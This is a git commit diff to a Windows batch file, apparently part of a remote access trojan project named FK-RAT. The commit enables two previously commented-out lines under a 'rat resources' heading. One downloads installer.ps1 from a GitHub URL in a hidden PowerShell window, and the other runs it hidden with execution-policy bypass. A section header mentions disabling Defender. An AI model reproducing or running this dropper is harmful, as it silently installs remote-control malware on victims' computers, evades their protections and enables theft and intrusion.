783f7371c16b729965692ec1a4ed85233aeeff99
Sunnickel <alexanderreiter20@gmail.com>
2023-10-29 17:00:28 +0100

    asd

--- files/wget.cmd
+++ files/wget.cmd
@@ -33,6 +33,5 @@ REM diable defender
 
 
 REM rat resources
-powershell
-@REM powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -URI https://raw.githubusercontent.com/Sunnickel/FK-RAT/main/files/installer.ps1 -OutFile installer.ps1"; 
-@REM powershell Start-Process -windowstyle hidden -ep bypass "installer.ps1"
+powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -URI https://raw.githubusercontent.com/Sunnickel/FK-RAT/main/files/installer.ps1 -OutFile installer.ps1"; 
+powershell Start-Process -windowstyle hidden -ep bypass "installer.ps1"
